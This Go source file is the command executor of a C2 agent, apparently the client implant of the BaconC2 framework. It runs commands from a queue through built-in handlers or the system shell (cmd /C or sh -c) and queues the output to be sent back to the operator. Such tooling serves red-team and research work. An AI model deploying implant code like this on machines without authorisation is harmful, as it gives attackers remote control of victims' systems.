package executor

import (
	"bytes"
	"fmt"
	"os/exec"
	"runtime"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/client/config"
	"github.com/RabbITCybErSeC/BaconC2/client/core/commands"
	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
	local_models "github.com/RabbITCybErSeC/BaconC2/client/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
)

type DefaultCommandExecutor struct {
	queue           queue.GenericQueue[models.Command]
	resultsQueue    queue.GenericQueue[models.CommandResult]
	transport       transport.ITransportProtocol
	config          *config.AgentConfig
	commandRegistry *commands.CommandHandlerRegistry
}

func NewDefaultCommandExecutor(queue queue.GenericQueue[models.Command], resultsQueue queue.GenericQueue[models.CommandResult], transport local_models.ITransportProtocol, streamingTransport local_models.IStreamingTransport, cfg *config.AgentConfig) models.ICommandExecutor {
	registry := commands.NewCommandHandlerRegistry()
	commands.RegisterBuiltInCommands(registry, resultsQueue, transport, streamingTransport)
	return &DefaultCommandExecutor{
		queue:           queue,
		resultsQueue:    resultsQueue,
		transport:       transport,
		config:          cfg,
		commandRegistry: registry,
	}
}

func (e *DefaultCommandExecutor) Execute(cmd models.Command) models.CommandResult {
	// Check for built-in commands
	if handler, exists := e.commandRegistry.GetHandler(cmd.Command); exists {
		return handler(cmd)
	}

	result := models.CommandResult{
		ID: cmd.ID,
	}

	var execCmd *exec.Cmd
	if isWindows() {
		execCmd = exec.Command("cmd", "/C", cmd.Command)
	} else {
		execCmd = exec.Command("sh", "-c", cmd.Command)
	}

	var stdout, stderr bytes.Buffer
	execCmd.Stdout = &stdout
	execCmd.Stderr = &stderr

	err := execCmd.Run()
	var output interface{}
	if err != nil {
		result.Status = models.CommandStatusFailed
		output = map[string]string{"error": stderr.String()}
	} else {
		result.Status = models.CommandStatusCompleted
		output = map[string]string{"output": stdout.String()}
	}

	result.Output = output

	if err := e.resultsQueue.Add(result); err != nil {
		fmt.Printf("Error queuing result for command %s: %v\n", cmd.ID, err)
		result.Status = "error"
		result.Output = map[string]string{"error": fmt.Sprintf("Failed to queue result: %v", err)}
	}

	return result
}

func (e *DefaultCommandExecutor) ProcessCommandQueue() {
	for {
		cmd, ok := e.queue.Get()
		if !ok {
			time.Sleep(100 * time.Millisecond)
			continue
		}
		result := e.Execute(cmd)

		if result.Status != models.CommandStatusCompleted {
			fmt.Printf("Command %s with: %s\n", cmd.ID, result.Output)
		} else {
			fmt.Printf("Command %s queued result\n", cmd.ID)
			e.queue.RemoveFirst()
		}

		time.Sleep(100 * time.Millisecond)
	}
}

func isWindows() bool {
	return runtime.GOOS == "windows"
}
